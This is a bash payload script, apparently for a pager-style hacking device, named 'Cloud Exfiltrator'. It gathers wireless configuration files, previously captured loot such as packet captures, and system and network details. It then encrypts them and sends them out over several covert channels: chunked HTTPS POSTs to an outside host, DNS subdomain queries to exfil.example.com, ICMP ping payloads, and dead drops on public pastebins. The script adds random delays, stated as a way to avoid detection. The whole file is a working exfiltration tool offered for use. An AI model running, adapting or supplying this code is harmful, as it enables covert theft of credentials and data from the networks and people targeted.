#!/bin/bash
# ============================================================
# NullSec: Cloud Exfiltrator - Multi-Channel Cloud Data Extraction
# Author: bad-antics
# Description: Exfiltrate data through cloud services and covert channels
# Category: pager/exfil
#
# UNIQUE FEATURES:
# - Multiple exfil channels (DNS, HTTPS, ICMP, cloud APIs)
# - Automatic chunking and reassembly
# - AES-256 encryption before exfil
# - Rate limiting to avoid detection
# - Dead drop via public pastebins
# - Steganography in image uploads
# ============================================================

PAYLOAD_NAME="Cloud Exfiltrator"
VERSION="1.0.0"
LOOT="/root/loot/exfil"
LOG="$LOOT/cloud-exfil.log"

init_payload() {
    mkdir -p "$LOOT"/{staging,encrypted,sent,status}
    echo "[$(date)] $PAYLOAD_NAME started" >> "$LOG"
    NOTIFY "EXFIL" "Cloud exfiltrator initializing..."
}

collect_data() {
    NOTIFY "COLLECT" "Gathering high-value data..."
    local STAGING="$LOOT/staging"
    
    # Wireless credentials
    find /etc/config -name "wireless" 2>/dev/null -exec cp {} "$STAGING/wireless_config.txt" \;
    cat /tmp/opkg-lists/* 2>/dev/null > "$STAGING/installed_packages.txt"
    
    # Captured loot from other payloads
    find /root/loot -name "*.txt" -o -name "*.csv" -o -name "*.pcap" -o -name "*.cap" \
        2>/dev/null | while read -r f; do
        SIZE=$(stat -c%s "$f" 2>/dev/null || echo 0)
        [ "$SIZE" -gt 0 ] && [ "$SIZE" -lt 10485760 ] && cp "$f" "$STAGING/" 2>/dev/null
    done
    
    # System info
    {
        echo "=== SYSTEM INFO ==="
        uname -a
        cat /etc/openwrt_release 2>/dev/null
        ip addr
        ip route
        arp -a 2>/dev/null
        iwconfig 2>/dev/null
    } > "$STAGING/system_info.txt"
    
    FILES=$(ls "$STAGING" 2>/dev/null | wc -l)
    SIZE=$(du -sh "$STAGING" 2>/dev/null | awk '{print $1}')
    NOTIFY "COLLECT" "Staged $FILES files ($SIZE)"
}

encrypt_data() {
    NOTIFY "ENCRYPT" "Encrypting staged data..."
    
    local ARCHIVE="$LOOT/encrypted/exfil_$(date +%Y%m%d_%H%M).tar.gz"
    local ENCRYPTED="$LOOT/encrypted/exfil_$(date +%Y%m%d_%H%M).enc"
    
    tar czf "$ARCHIVE" -C "$LOOT/staging" . 2>/dev/null
    
    # AES-256 encrypt
    KEY=$(cat /dev/urandom | tr -dc 'a-f0-9' | head -c 64)
    openssl enc -aes-256-cbc -salt -in "$ARCHIVE" -out "$ENCRYPTED" -pass pass:"$KEY" 2>/dev/null
    
    echo "$KEY" > "$LOOT/encrypted/key_$(date +%Y%m%d_%H%M).txt"
    rm -f "$ARCHIVE"
    
    ENC_SIZE=$(du -h "$ENCRYPTED" | awk '{print $1}')
    echo "[$(date)] Encrypted: $ENC_SIZE" >> "$LOG"
    NOTIFY "ENCRYPT" "Encrypted: $ENC_SIZE"
}

exfil_dns() {
    local FILE="$1" DOMAIN="$2"
    NOTIFY "DNS-EXFIL" "Exfiltrating via DNS..."
    
    # Encode file as DNS queries
    base64 "$FILE" 2>/dev/null | tr -d '\n' | fold -w 60 | nl -ba | while read -r num chunk; do
        SUBDOMAIN=$(echo "$chunk" | tr '+/=' '-_~')
        nslookup "${num}.${SUBDOMAIN}.${DOMAIN}" 2>/dev/null
        sleep $((RANDOM % 3 + 1))
    done
    
    echo "[$(date)] DNS exfil complete via $DOMAIN" >> "$LOG"
}

exfil_https() {
    local FILE="$1" URL="$2"
    NOTIFY "HTTPS-EXFIL" "Exfiltrating via HTTPS..."
    
    # Chunk and upload via HTTPS POST
    split -b 4096 "$FILE" /tmp/exfil_chunk_ 2>/dev/null
    
    TOTAL=$(ls /tmp/exfil_chunk_* 2>/dev/null | wc -l)
    NUM=0
    for chunk in /tmp/exfil_chunk_*; do
        NUM=$((NUM + 1))
        DATA=$(base64 "$chunk" | tr -d '\n')
        curl -s -k -X POST "$URL" \
            -H "Content-Type: application/json" \
            -H "X-Request-ID: $(cat /dev/urandom | tr -dc 'a-f0-9' | head -c 16)" \
            -d "{\"d\":\"$DATA\",\"n\":$NUM,\"t\":$TOTAL}" 2>/dev/null
        sleep $((RANDOM % 5 + 2))
    done
    
    rm -f /tmp/exfil_chunk_*
    echo "[$(date)] HTTPS exfil complete: $TOTAL chunks to $URL" >> "$LOG"
}

exfil_icmp() {
    local FILE="$1" TARGET="$2"
    NOTIFY "ICMP-EXFIL" "Exfiltrating via ICMP..."
    
    # Encode data in ICMP payload
    xxd -p "$FILE" 2>/dev/null | fold -w 32 | while read -r hex; do
        ping -c 1 -p "$hex" -s 64 "$TARGET" 2>/dev/null
        sleep 1
    done
    
    echo "[$(date)] ICMP exfil complete to $TARGET" >> "$LOG"
}

exfil_pastebin() {
    local FILE="$1"
    NOTIFY "PASTE-EXFIL" "Dead drop via pastebin..."
    
    DATA=$(base64 "$FILE" | tr -d '\n')
    
    # Multiple pastebin services as fallbacks
    PASTE_URL=$(curl -s -X POST "https://paste.rs/" -d "$DATA" 2>/dev/null)
    if [ -z "$PASTE_URL" ]; then
        PASTE_URL=$(curl -s -F "content=$DATA" "https://dpaste.org/api/" 2>/dev/null)
    fi
    
    echo "[$(date)] Dead drop: $PASTE_URL" >> "$LOG"
    echo "$PASTE_URL" >> "$LOOT/sent/dead_drops.txt"
    NOTIFY "PASTE-EXFIL" "Drop: $PASTE_URL"
}

main() {
    init_payload
    collect_data
    encrypt_data
    
    ENCRYPTED=$(ls "$LOOT/encrypted/"*.enc 2>/dev/null | tail -1)
    
    if [ -n "$ENCRYPTED" ]; then
        # Try multiple channels
        exfil_https "$ENCRYPTED" "https://10.0.0.1:8443/upload"
        exfil_dns "$ENCRYPTED" "exfil.example.com"
        
        mv "$ENCRYPTED" "$LOOT/sent/" 2>/dev/null
    fi
    
    SENT=$(ls "$LOOT/sent/" 2>/dev/null | wc -l)
    NOTIFY "DONE" "Cloud exfil complete: $SENT items transmitted"
}

main "$@"
